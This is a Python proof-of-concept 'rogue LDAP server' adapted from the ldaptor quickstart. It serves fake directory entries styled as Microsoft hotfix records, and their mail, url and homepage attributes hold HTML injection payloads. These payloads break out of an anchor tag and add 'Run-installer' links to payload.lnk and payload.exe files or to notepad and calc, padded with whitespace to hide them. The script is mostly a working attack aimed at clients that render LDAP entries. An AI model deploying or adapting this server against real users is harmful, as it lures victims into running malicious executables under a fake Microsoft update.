# LDAP Rogue Server. Sample taken from https://ldaptor.readthedocs.io/en/latest/quickstart.html#ldap-server-quick-start
# Fully tested with Python 2.7. To run, install the package from pip: pip install ldaptor.
# URL protocol example => ldap://127.0.0.1:389/cn=Microsoft,ou=people,dc=example,dc=org

import sys
import io

from twisted.application import service
from twisted.internet.endpoints import serverFromString
from twisted.internet.protocol import ServerFactory
from twisted.python.components import registerAdapter
from twisted.python import log
from ldaptor.inmemory import fromLDIFFile
from ldaptor.interfaces import IConnectedLDAPEntry
from ldaptor.protocols.ldap.ldapserver import LDAPServer

LDIF = b"""\
dn: dc=org
dc: org
objectClass: dcObject

dn: dc=example,dc=org
dc: example
objectClass: dcObject
objectClass: organization

dn: ou=people,dc=example,dc=org
objectClass: organizationalUnit
ou: people

dn: cn=Microsoft,ou=people,dc=example,dc=org
cn: Microsoft
gn: Microsoft
company: Microsoft
title: Microsoft KB5001337-hotfix
mail:"></a><a href="..\hidden\payload.lnk">Run-installer                                                                                                                                                    </a>
url:"></a><a href="..\hidden\payload.exe">Run-installer                                                                                                                                                                                                                                                                                                                                                                              </a>
wwwhomepage:"></a><a href="notepad">Run-installer                                                                                                                                                                                                                                                                                                                                                                              </a>
objectclass: top
objectclass: person
objectClass: inetOrgPerson

dn: cn=PoC,ou=people,dc=example,dc=org
cn: PoC
gn: Microsoft
company: Microsoft
title: Microsoft KB5014666-hotfix
mail:"></a><a href="notepad">Run-installer                                                                                                                                                    </a>
url:"></a><a href="calc">Run-installer                                                                                                                                                                                                                                                                                                                                                                              </a>
wwwhomepage:"></a><a href="notepad">Run-installer                                                                                                                                                                                                                                                                                                                                                                              </a>
objectclass: top
objectclass: person
objectClass: inetOrgPerson

"""


class Tree:
    def __init__(self):
        global LDIF
        self.f = io.BytesIO(LDIF)
        d = fromLDIFFile(self.f)
        d.addCallback(self.ldifRead)

    def ldifRead(self, result):
        self.f.close()
        self.db = result


class LDAPServerFactory(ServerFactory):
    protocol = LDAPServer

    def __init__(self, root):
        self.root = root

    def buildProtocol(self, addr):
        proto = self.protocol()
        proto.debug = self.debug
        proto.factory = self
        return proto


if __name__ == "__main__":
    from twisted.internet import reactor

    if len(sys.argv) == 2:
        port = int(sys.argv[1])
    else:
        port = 389
    # First of all, to show logging info in stdout :
    log.startLogging(sys.stderr)
    # We initialize our tree
    tree = Tree()
    # When the LDAP Server protocol wants to manipulate the DIT, it invokes
    # `root = interfaces.IConnectedLDAPEntry(self.factory)` to get the root
    # of the DIT.  The factory that creates the protocol must therefore
    # be adapted to the IConnectedLDAPEntry interface.
    registerAdapter(lambda x: x.root, LDAPServerFactory, IConnectedLDAPEntry)
    factory = LDAPServerFactory(tree.db)
    factory.debug = True
    application = service.Application("ldaptor-server")
    myService = service.IServiceCollection(application)
    serverEndpointStr = "tcp:{0}".format(port)
    e = serverFromString(reactor, serverEndpointStr)
    d = e.listen(factory)
    reactor.run()